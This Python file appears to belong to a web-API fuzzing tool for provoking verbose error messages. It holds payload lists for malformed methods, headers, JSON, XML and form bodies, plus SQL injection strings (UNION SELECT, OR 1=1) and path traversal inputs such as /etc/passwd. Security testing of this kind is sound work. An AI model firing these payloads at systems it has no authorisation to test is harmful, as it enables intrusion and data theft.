# -*- coding: utf-8 -*-
"""
Payload definitions for verbose error testing
Organized by category with priority ordering
"""

class Payloads:
    """All test payloads organized by category"""
    
    METHOD_FUZZING = {
        'invalid_standard': [
            'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 
            'HEAD', 'OPTIONS', 'TRACE', 'CONNECT'
        ],
        'random_invalid': [
            'APAAJA', 'TESTING', 'HACK', 'ADMIN', 
            'DEBUG', 'INVALID', 'TEST123'
        ],
        'method_manipulation': [
            'get',
            'Post',
            'POST\r\n',
            'POST ',
            'PO ST',
            'POST\x00'
        ]
    }
    
    HEADER_PAYLOADS = {
        'tier_1_most_likely': [
            '{original}/',
            '',
            '{original}\r\n',
        ],
        'tier_2_likely': [
            '{original}\\',
            '{original} ',
            '{original}\t',
            'null',
            '{original}<>',
        ],
        'tier_3_less_likely': [
            '{original}\x00',
            '{original}%00',
            '{original},,',
            '{original}::',
            '{original}\'',
            '{original}"',
            '{original};',
        ]
    }
    
    JSON_STRUCTURE_BREAKING = {
        'tier_1_most_likely': [
            '{"key": "value""}',
            '{"key": "value}',
            '{"key"": "value"}',
            '{"key": "value""test"}',
            '{{"key": "value"}',
            '{"key": val"ue"}',
        ],
        'tier_2_likely': [
            '{"key": "value",}',
            '{"key": "value"}}',
            '{"key": "value" "key2": "val"}',
            '{"key": "value\n"}',
            '{"key": trues}',
            '{"key": 10test}',
        ],
        'tier_3_less_likely': [
            '{"key": "value"/*comment*/}',
            '{"key": "value\r\n"}',
            '{"key": "value\x00"}',
            '{"key": "value\u0000"}',
            '{"key": "blabla}',
        ]
    }
    
    XML_STRUCTURE_BREAKING = {
        'tier_1_most_likely': [
            '<tag>value',
            '<tag>value</tag></tag>',
        ],
        'tier_2_likely': [
            '<tag>value<!--',
            '<tag><![CDATA[value',
        ],
        'tier_3_less_likely': [
            '<tag xmlns="invalid">value</tag>',
            '<tag attr="val>value</tag>',
        ]
    }
    
    FORM_DATA_BREAKING = {
        'tier_1_most_likely': [
            'key=value&&key2=val',
            'key=&key2=val',
        ],
        'tier_2_likely': [
            'key=value&key=inject',
            'key=valuekey2=val',
        ]
    }
    
    PARAMETER_INJECTION = {
        'sql_injection': {
            'tier_1': [
                "'", 
                '"', 
                "' OR '1'='1", 
                '" OR "1"="1',
                "1' AND '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR '1'='1'--",
                "admin'--",
                "admin' #",
            ],
            'tier_2': [
                "1' OR '1'='1",
                "' UNION SELECT NULL--",
                "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
                "1 AND 1=1",
                "1 AND 1=2",
                "1' AND '1'='2",
            ],
        },
        'json_syntax_corruption': {
            'tier_1': [
                # Break NUMBER values
                '10test',
                '10tes',
                '123abc',
                '99invalid',
                # Break BOOLEAN values  
                'trues',
                'falses',
                'True',
                'FALSE',
                # Break STRING values
                'test"quote',
                "test'quote",
            ],
            'tier_2': [
                '13.3.7',
                '00000',
                '-text',
                'null123',
                '{"nested"}',
            ],
        },
        'type_confusion': {
            'tier_1': ['999999', 'true', 'false', '[]', '{}'],
            'tier_2': ['null', 'undefined', 'NaN'],
        },
        'null_empty': {
            'tier_1': ['', 'null'],
            'tier_2': ['NULL', 'None', '0'],
        },
        'path_traversal': {
            'tier_1': ['../', '..\\ '],
            'tier_2': ['..../', '..\\..\\', '/etc/passwd'],
        },
        'overflow': {
            'tier_1': ['A' * 10000, '9' * 20],
            'tier_2': ['-1', '2147483648'],
        },
        'special_chars': {
            'tier_1': ['<>', '{}', '[]', '!@#$%'],
            'tier_2': ['\r\n', '\x00', '\u0000'],
        }
    }
    
    NESTED_MANIPULATION = {
        'object_poisoning': [
            'string_instead_of_object',
            '[]',
            'null',
            '{}',
        ],
        'array_manipulation': [
            '[]',
            'not_an_array',
            '[null, null]',
        ]
    }
    
    @staticmethod
    def apply_payload(original_value, payload_template):
        """
        Apply payload template to original value
        
        Args:
            original_value: Original header/parameter value
            payload_template: Payload template with {original} placeholder
            
        Returns:
            Modified value with payload applied
        """
        if '{original}' in payload_template:
            return payload_template.replace('{original}', str(original_value))
        return payload_template
    
    @staticmethod
    def get_all_header_payloads():
        """Get all header payloads in priority order"""
        all_payloads = []
        for tier in ['tier_1_most_likely', 'tier_2_likely', 'tier_3_less_likely']:
            all_payloads.extend(Payloads.HEADER_PAYLOADS[tier])
        return all_payloads
    
    @staticmethod
    def get_method_payloads():
        """Get all method fuzzing payloads"""
        all_methods = []
        all_methods.extend(Payloads.METHOD_FUZZING['invalid_standard'])
        all_methods.extend(Payloads.METHOD_FUZZING['random_invalid'])
        all_methods.extend(Payloads.METHOD_FUZZING['method_manipulation'])
        return all_methods
    
    @staticmethod
    def get_json_breaking_payloads():
        """Get JSON structure breaking payloads in priority order"""
        all_payloads = []
        for tier in ['tier_1_most_likely', 'tier_2_likely', 'tier_3_less_likely']:
            all_payloads.extend(Payloads.JSON_STRUCTURE_BREAKING[tier])
        return all_payloads
    
    @staticmethod
    def get_parameter_payloads(injection_type='all'):
        """
        Get parameter injection payloads
        
        Args:
            injection_type: Type of injection (sql_injection, type_confusion, etc.)
                          or 'all' for all types
        """
        if injection_type == 'all':
            all_payloads = []
            for inj_type, tiers in Payloads.PARAMETER_INJECTION.items():
                for tier, payloads in tiers.items():
                    all_payloads.extend(payloads)
            return all_payloads
        
        if injection_type in Payloads.PARAMETER_INJECTION:
            payloads = []
            for tier, tier_payloads in Payloads.PARAMETER_INJECTION[injection_type].items():
                payloads.extend(tier_payloads)
            return payloads
        
        return []
